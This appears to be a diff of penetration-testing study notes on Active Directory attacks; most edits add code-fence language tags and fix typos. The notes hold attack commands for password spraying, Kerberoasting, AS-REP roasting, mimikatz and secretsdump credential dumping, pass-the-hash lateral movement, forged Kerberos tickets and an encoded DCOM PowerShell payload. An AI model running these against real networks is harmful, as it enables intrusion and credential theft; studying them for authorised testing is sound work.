@@ -4,24 +4,24 @@ p## Section 1 Active Directory Introduction
 ## Section 2 Manual Enumeration
 ### 21.2.1 Enumeration Using Legacy Windows Tools
 - Get all users on the domain with 
-```
+```batch
 net user /domain
 ```
 - Get detailed information on a specific user with 
-```
+```batch
 net user <USERNAME> /domain
 ```
 - Get info on groups in the domain with 
-```
+```batch
 net group /domain
 ```
 - Look for custom groups that were created and enumerate those first
 - Enumerate a specific group with
-```
+```batch
 net group <GROUP_NAME> /domain
 ```
 - Check local admins with
-```
+```batch
 net localgroup Administrators
 ```
 ### 21.2.2 Enumerating Active Directory Using PowerShell and .NET Classes
@@ -32,12 +32,12 @@ net localgroup Administrators
 LDAP://<HOSTNAME>[:PORT_NUMBER(optional)][/DistinguishedName]
 ```
 - To get the Domain Class and the GetCurrentdomain method run the following command in powershell
-```
+```PowerShell
 [System.DirectoryServices.ActiveDirectory.Domain]
 ```
 - Check the resources file for the Get_domain_information.ps1 file
 - Bypass execution policy in powershell with 
-```
+```PowerShell
 powershell -ep bypass
 ```
 - Check the resources folder for the domain_enumeration.ps1 file
@@ -46,70 +46,70 @@ powershell -ep bypass
 - Check resources folder for domain_enumeration_complete.ps1
 - Check resources folder for domain_enum_function.ps1
 - How to use domain_enum_function.ps1
-```
+```PowerShell
 Import-Module .\domain_enum_function.ps1
 ```
 - Filter on a specific samAccountType
-```
+```PowerShell
 LDAPSearch -LDAPQuery "(samAccountType=805306368)"
 ```
 - To filter on an objectclass group
-```
+```PowerShell
 LDAPSearch -LDAPQuery "(objectclass=group)"
 ```
 - To enumerate every group available in the domain and also display the user members we can pipe the output in a new variable and use a foreach loop tat will print the property for a group.
 	- This allows us to select specific attributes we are interested in
 	- For example let's focus on the CN and member attributes with 
-```
+```PowerShell
 foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group))) {$group.properties | select {$_.cn}, {$_.member}}
 ```
 - To specify the sales department use 
-```
+```PowerShell
 $sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"
 $sales.properties.member
 ```
 ### 21.2.4 AD Enumeration With Powerview
 - First 
-```
+```PowerShell
 powershell -ep bypass
 ```
-```
+```PowerShell
 Import-Module .\PowerView.ps1
 ```
 - Get Domain info
-```
+```PowerShell
 Get-NetDomain
 ```
 - Get cn for users in Get-NetUser
-```
+```PowerShell
 Get-NetUser | select cn 
 ```
 - Find users with old or weak passwords
-```
+```PowerShell
 Get-NetUser | select cn,pwlastset,lastlogon
 ```
 - Enumerate groups
-```
-Get-NetFroups 
+```PowerShell
+Get-NetGroup 
 ```
 - Clean Group enumeration
-```
+```PowerShell
 Get-NetGroup | select cn
 ```
 - Enumerate specific groups
-```
+```PowerShell
 Get-NetGroup "<GROUPNAME>" 
 ```
 - Enumerate specific group for members 
-```
+```PowerShell
 Get-NetGroup "<GROUPNAME>" | select member
 ```
 - Find vulnerable operating systems 
-```
+```PowerShell
 Get-NetComputer | select operatingsystem,operatingsystemversion
 ```
 - Scan the network in an attempt to determine if our current user has administrative permissions on any computers in the domain
-```
+```PowerShell
 Find-LocalAdminAccess
 ```
 ### 21.3.2 Getting An Overview - Permissions and Logged On Users
@@ -117,19 +117,19 @@ Find-LocalAdminAccess
 	- There may be other accounts that have higher privileges than domain user that we could use to maintain access
 		- Like a user from the Service Accounts Group which may have local administrator privileges on specific services
 - PowerView find any administrative access for a user
-```
+```PowerShell
 Find-LocalAdminAccess
 ```
 - PowerView find any logged in users with
-```
+```PowerShell
 Get-NetSession -ComputerName <COMputeRNAME>
 ```
 - If there is no output to make sure we aren't receiving any error messages use
-```
+```PowerShell
 Get-NetSession -ComputerName <COMPUTERNAME> -Verbose
 ```
 - If the information is off you can troubleshoot permissions with 
-```
+```PowerShell
 Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity | fl
 ```
 - To find active sessions if Get-NetSessions is not available we can use PsLoggedon from the Sysinternals suite which may be installed by default
@@ -141,20 +141,20 @@ Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecuri
 	- If it is enabled the service will stop after 10 minutes of activity to save resources
 		- But it will re-enable with an automatic trigger when we connect with PsLoggedon
 		- To run this you use
-```
-.\PsLoggedon.ese \\Computername
+```PowerShell
+.\PsLoggedon.exe \\Computername
 ```
 ### 21.3.3 Enumeration Through Service Principal Names
 - To enumerate SPNs on the domain both clients and servers use 
-```
+```PowerShell
 setspn -L
 ```
 - If you know a specific service account name use 
-```
+```PowerShell
 setspn -L <SERVICE_NAME> (e.g. iis_service)
 ```
 - PowerView get SPNs and pipe output to samaccountname and serviceprincipalname use
-```
+```PowerShell
 Get-NetUser -SPN | select samaccountname, serviceprincipalname
 ```
 ### 21.3.4 Enumerating Object Permissions
@@ -175,11 +175,11 @@ Get-NetUser -SPN | select samaccountname, serviceprincipalname
 		- Password change for the object self (Self-Membership)
 			- Add ourselves to for example a group
 - Enumerate ACEs for a known identity with PowerView
-```
+```PowerShell
 Get-ObjectAcl -Identity stephanie
 ```
 - Convert SID to name with PowerView
-```
+```PowerShell
 Convert-SidToName <SID>
 ```
 - Highest permission you can have on an AD object is GenericAll
@@ -191,28 +191,28 @@ Convert-SidToName <SID>
 	- powershell -eq flag to filter the ActiveDirectoryRights property
 		- Only displaying the values that = GenericAll 
 		- Pipe the results into selecting only displaying the SecurityIdentifier and ActiveDirectoryRights with 
-```
+```PowerShell
 Get-ObjectAcl -Identity "Management Department" | ?{$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier, ActiveDirectoryRights
 ```
 - Convert multiple SIDs to names with PowerView
-```
+```PowerShell
 "<SID>","<SID>" | Convert-SidToName
 ```
 - Add a powerful user to an AD group
-```
+```batch
 net group "Management Department" stephanie /add /domain
 ```
 - Verify with 
-```
+```PowerShell
 Get-NetGroup "Management Department" | select member
 ```
 - Remove the user with 
-```
+```PowerShell
 net group "Management Department" stephanie /del /domain
 ```
 ### 21.3.5 Enumerating Domain Shares 
 - Enumerate domain shares with PowerView
-```
+```PowerShell
 Find-DomainShare
 ```
 - An important Domain share to investigate is SYSVOL 
@@ -223,10 +223,10 @@ Find-DomainShare
 		- Example enumeration is 
 			- \\dc1.corp.com\Sysvol\corp.com
 - During an assessment investigate every folder such as the policies and scripts folder with 
-```
+```PowerShell
 ls \\dc1.corp.com\Sysvol\corp.com\Policies
 ```
-```
+```PowerShell
 ls \\dc1.corp.com\Sysvol\corp.com\Scripts
 ```
 - Look for encrypted passwords with a value of cpassword in old configuration files of backups in ml format
@@ -240,18 +240,18 @@ gpp-decrypt "<PASSWORD_STRING>"
 
 ### 21.4.1 Collecting Data with SharpHound
 - Import Sharphound to memory 
-```
+```PowerShell
 powershell -ep bypass
 ```
-```
+```PowerShell
 Import-Module .\Sharphound.ps1
 ```
 - The following must be run before running Sharphound
-```
+```PowerShell
 Invoke-BloodHound
 ```
 - Get help for Invoke-BloodHound with
-```
+```PowerShell
 Get-Help Invoke-BloodHound
 ```
 - Begin with Collection method 
@@ -261,7 +261,7 @@ Get-Help Invoke-BloodHound
 		- By default Sharphound will gather the data in JSON files and automatically zip them making it easy for us to transfer the file to kali later
 		- We will have to save this file on our desktop with a "<FILE_NAME>" prefix
 		- Example 
-```
+```PowerShell
 Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop -OutputPrefix "corp audit"
 ```
 - BloodHound automatically creates the .bin cache file to speed up data collection 
@@ -274,19 +274,19 @@ Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desk
 	- For example if a user logged on after we collectedd a snapshot we would have missed it in our snapshot but we will not miss it with the looping functionality
 		- NOT NEEDED FOR THE TEST 
 - Bloodhound-python
-```
+```bash
 bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -ns <RHOST> -d <DOMAIN> -c all
 #Output saved in kali machine
 ```
 ### 21.4.2 Analyzing Data Using BloodHound
 - Run neo4j with 
-```
+```bash
 sudo neo4j start
 ```
 - Default credentials for neo4j are 
 	- neo4j:neo4j
 - After running neo4j start bloodhound from the terminal with
-```
+```bash
 bloodhound
 ```
 - To logon use the neo4j username and password
@@ -298,19 +298,19 @@ bloodhound
 	- In a relationship click the line between nodes and click ?help and BloodHound will show additional information
 ## LDAPDOMAINDUMP
 - These files contain information in a well structured webpage format
-```
+```bash
 sudo ldapdomaindump ldaps://<IP> -u '<USERNAME>' -p '<PASSWORD>'
 ```
 ## PlumHound
 - Link: [https://github.com/PlumHound/PlumHound](https://github.com/PlumHound/PlumHound) install from the steps mentioned.
 - Keep both Bloodhound and Neo4j running as this tool acquires information from them.
-```
+```bash
 sudo python3 plumhound.py --easy -p <NEO4JPASSWORD>
 ```
-```
+```bash
 python3 plumhound.py -x tasks/default.tasks -p <NEO4jPASSWORD>
 ```
-```
+```bash
 firefox index.html
 ```
 ## PingCastle
@@ -319,25 +319,25 @@ firefox index.html
 - It gives a report at end of scan.
 ## PsLoggedon
 - Check to see user logons at remote system of a domain
-```
+```PowerShell
 .\PsLoggedon.exe \\<COMPUTERNAME>
 ```
 ## GPP or CPassword
 - Impacket tools
 - With a NULL session
-```
+```bash
 Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'
 ```
 - With cleartext credentials
-```
+```bash
 Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
 ```
 - Pass the hash (NT Hash)
-```
+```bash
 Get-GPPPassword.py -hashes:'NTHASH' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
 ```
 - Parse a local file
-```
+```bash
 Get-GPPPassword.py -xmlfile '/path/to/policy.xml' 'LOCAL'
 ```
 - If it's an SMB share =If SYSVOL share or any share which domain name as folder name do the following:
@@ -348,49 +348,49 @@ https://github.com/ahmetgurel/Pentest-Hints/blob/master/AD%20Hunting%20Passwords
 grep -inr "cpassword"
 ```
 - Crackmapexec
-```
+```bash
 crackmapexec smb <TARGET[s]> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M gpp_password
 ```
-```
+```bash
 crackmapexec smb <TARGET[s]> -u <USERNAME> -H <LMHASH:NTLM:HASH> -d <DOMAIN> -m gpp_password
 ```
 - Decrypting the CPassword
-```
+```bash
 gpp-decrypt "cpassword"
 ```
 ## Password Spraying
 ### Crackmapexec
-```
+```bash
 crackmapexec smb <IP> -u <USERS.TXT> -p 'pass' -d <DOMAIN> --continue-on-success
 ```
 ### Kerbrute
-```
+```bash
 kerbrute passwordspray -d <DOMAIN> .\usernames.txt "pass"
 ```
 ## AS-REP Roasting
 - Get hash of AS-REP roastable accounts from kali
-```
+```bash
 impacket-GetNPUsers -dc-ip <DC_IP> <DOMAIN>/<USERNAME>:<PASSWORD> -request
 ```
 - Get from compromised windows host
-```
+```batch
 .\Rubeus.exe asreproast /nowrap
 ```
 - Crack the hashes
-```
+```bash
 hashcat -m 18200 hashes.txt wordlist.txt --force
 ```
 ## Kerberoasting
 - Dumping from compromised windows host and saving with a custom name
-```
+```batch
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 ```
 - Impacket from kali machine
-```
+```bash
 impacket-GetUserSPNs -dc-ip <DC_IP> <DOMAIN>/<USERNAME>:<PASSWORD> -request
 ```
 - Cracking the passwords
-```
+```bash
 hashcat -m 13100 hashes.txt wordlist.txt --force
 ```
 ## Silver Tickets
@@ -403,7 +403,7 @@ privilege::debug
 sekurlsa::logonpasswords
 ```
 - Getting Domain SID
-```
+```batch
 whoami /user
 ```
 ```
@@ -421,29 +421,29 @@ exit
 klist
 ```
 - Accessing service
-```
+```PowerShell
 iwr -UseDefaultCredentials <SERVICENAME>://<COMPUTERNAME>
 ```
 ## Secretsdump
-```
+```bash
 secretsdump.py <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
 ```
 - For local user
-```
+```bash
 secretsdump.py <USERNAME>@<IP> -hashes <LM_HASH:NTLM_HASH>
 ```
 - For domain user
-```
+```bash
 secretsdump.py <DOMAIN>/<USERNAME>@<IP> -hashes <LM_HASH:NTLM_HASH>
 ```
 ## Dumping NTDS.dit
 - Use -just-dc-ntlm option with any of the secretsdump commands to dump ntds.dit
-```
+```bash
 secretsdump.py <DOMAIN>/<USERNAME>:<PASSWORD>@<IP> -just-dc-ntlm
 ```
 ## Lateral Movement
 ### PSExec SMBExec WMIExec AtEXEC
-```
+```bash
 psexec.py <domain>/<user>:<password1>@<IP>
 # the user should have write access to Admin share then only we can get sesssion
 
@@ -466,11 +466,11 @@ atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68a
 ### Winrs
 - Run this and check whether the user has access on the machine, if you have access then run a powershell reverse-shell
 	- run this on windows session
-```
+```PowerShell
 winrs -r:<COMPUTERNAME> -u:<USERNAME> -p:<PASSWORD> "<COMMAND>"
 ```
 ### Crackmapexec
-```
+```bash
 crackmapexec {smb/winrm/mssql/ldap/ftp/ssh/rdp} #supported services
 crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success # Bruteforcing attack, smb can be replaced. Shows "Pwned"
 crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success | grep '[+]' #grepping the way out!
@@ -499,7 +499,7 @@ crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz #runs default comma
 crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz -o COMMAND='privilege::debug' #runs specific command-M 
 ```
 ### Pass the ticket
-```
+```batch
 .\mimikatz.exe
 ```
 ```
@@ -515,7 +515,7 @@ klist
 dir \\<RHOST>\admin$
 ```
 ### DCOM
-```
+```PowerShell
 $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
 
 $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
@@ -525,7 +525,7 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
 ```
 ### Golden Ticket
 - Get the krbtgt hash
-```
+```batch
 .\mimikatz.exe
 ```
 ```
